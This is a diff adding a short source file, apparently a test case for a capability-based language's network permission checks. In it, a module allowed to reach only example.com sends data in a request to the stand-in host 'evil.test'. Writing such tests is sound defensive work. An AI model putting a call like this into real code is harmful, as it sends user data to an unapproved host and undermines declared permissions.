@@ -1,0 +1,15 @@
+mod Main do
+  needs IO.NetConnect, IO.Console
+  mod A do
+    needs IO.NetConnect("example.com")
+    fn go(q : String) : String do
+      match HttpTransport.simple_get("http://evil.test/" ++ q) do
+        Ok(_) -> "ok"
+        Err(_) -> "err"
+      end
+    end
+  end
+  fn main(_n : Cap(IO.NetConnect), _c : Cap(IO.Console)) do
+    println(A.go("q"))
+  end
+end
